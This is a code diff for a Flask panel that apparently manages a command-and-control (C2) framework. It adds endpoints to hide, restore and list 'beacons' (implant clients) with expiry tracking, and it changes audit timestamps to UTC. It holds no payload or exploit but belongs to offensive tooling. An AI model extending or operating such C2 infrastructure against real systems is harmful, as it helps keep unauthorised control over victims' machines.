@@ -2,6 +2,7 @@
 import json
 import os
 import time
+from datetime import datetime
 from typing import Any, Dict
 
 from flask import jsonify, render_template, request, Response
@@ -37,7 +38,7 @@ def _c2_audit(redis, line: str, output: str = "") -> None:
     try:
         entry = {
             "ts": time.time(),
-            "ts_iso": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "ts_iso": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + "Z",  # UTC 带 Z,前端 fmtLocal 转本地时区
             "line": str(line or "")[:300],
             "client": c2_bridge.get_current_beacon(),
             "output_head": str(output or "")[:200],
@@ -235,13 +236,76 @@ def register(app):
             return jsonify({"ok": False, "error": "C2 未启用"}), 400
         c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
         beacons = c2_bridge.list_beacons()
-        # 合并备注(Redis)
+        # 合并备注 + 隐藏状态(Redis)
         redis = app.config["get_redis"]()
+        hidden = set(redis.conn.zrange("fs3:c2:hidden", 0, -1) or [])
         for b in beacons:
             bid = b.get("client_id", "")
             if bid:
                 b["remark"] = redis.conn.get(f"fs3:c2:remark:{bid}") or ""
+                b["hidden"] = bid in hidden
         return jsonify({"ok": True, "beacons": beacons})
+
+    @app.route("/api/c2/beacon/<client_id>/hide", methods=["POST"])
+    @login_required
+    def c2_beacon_hide(client_id: str):
+        """隐藏 beacon 到收纳列表(Redis 标记;列表/轮询不再显示,beacon 本身不受影响)。"""
+        config = load_yaml(app.config["CONFIG_PATH"])
+        c2cfg = _c2_config(config)
+        if not c2cfg["enabled"]:
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
+        if not c2_bridge.get_beacon(client_id):
+            return jsonify({"ok": False, "error": "beacon not found"}), 404
+        redis = app.config["get_redis"]()
+        redis.conn.zadd("fs3:c2:hidden", {client_id: time.time()})
+        _c2_audit(redis, f"hide beacon {client_id}", "ok")
+        return jsonify({"ok": True, "hidden": True})
+
+    @app.route("/api/c2/beacon/<client_id>/unhide", methods=["POST"])
+    @login_required
+    def c2_beacon_unhide(client_id: str):
+        """从收纳列表恢复 beacon 到主列表。"""
+        config = load_yaml(app.config["CONFIG_PATH"])
+        c2cfg = _c2_config(config)
+        if not c2cfg["enabled"]:
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        redis = app.config["get_redis"]()
+        redis.conn.zrem("fs3:c2:hidden", client_id)
+        _c2_audit(redis, f"unhide beacon {client_id}", "ok")
+        return jsonify({"ok": True, "hidden": False})
+
+    @app.route("/api/c2/hidden")
+    @login_required
+    def c2_hidden():
+        """收纳列表:所有已隐藏且未过期的 beacon(含 hidden_at/expired 标记)。"""
+        config = load_yaml(app.config["CONFIG_PATH"])
+        c2cfg = _c2_config(config)
+        if not c2cfg["enabled"]:
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
+        redis = app.config["get_redis"]()
+        # 过期时限:与清理线程一致(beacon_expire_seconds,默认 1 天)
+        try:
+            expire = int((c2_bridge.status_detail().get("config") or {}).get("beacon_expire_seconds") or 86400)
+        except Exception:
+            expire = 86400
+        by_id = {b["client_id"]: b for b in c2_bridge.list_beacons()}
+        out = []
+        for bid, score in redis.conn.zrange("fs3:c2:hidden", 0, -1, withscores=True) or []:
+            b = by_id.get(bid)
+            if not b:
+                continue  # 已被清理线程移除
+            b["hidden_at"] = score
+            b["expired"] = False
+            try:
+                last = datetime.fromisoformat(b.get("last_seen", "").replace("Z", "+00:00"))
+                b["expired"] = (time.time() - last.timestamp()) > expire
+            except Exception:
+                pass
+            out.append(b)
+        out.sort(key=lambda x: float(x.get("hidden_at") or 0), reverse=True)
+        return jsonify({"ok": True, "beacons": out, "expire_seconds": expire})
 
     @app.route("/api/c2/beacon/<client_id>")
     @login_required
@@ -568,7 +632,7 @@ def register(app):
         try:
             entry = {
                 "ts": time.time(),
-                "ts_iso": time.strftime("%Y-%m-%d %H:%M:%S"),
+                "ts_iso": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + "Z",  # UTC 带 Z,前端 fmtLocal 转本地时区
                 "line": str(line or "")[:300],
                 "output_head": str(output or "")[:200],
             }
